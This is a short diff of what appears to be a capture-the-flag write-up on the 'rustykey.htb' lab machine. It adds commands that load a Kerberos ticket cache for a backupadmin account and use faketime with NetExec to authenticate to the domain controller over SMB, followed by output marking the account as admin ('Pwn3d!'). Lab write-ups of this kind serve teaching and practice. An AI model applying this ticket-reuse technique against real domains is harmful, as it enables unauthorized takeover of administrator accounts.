@@ -670,8 +670,18 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 Then i can request a ticket
 
 ```python
+❯❯❯ export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache 
 
+❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb --use-kcache   
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\backupadmin from ccache (Pwn3d!)
 ```
+
+This user is compromised!
+
+Also the pwned indicator showing this user is an admin
+
+
 
 
 
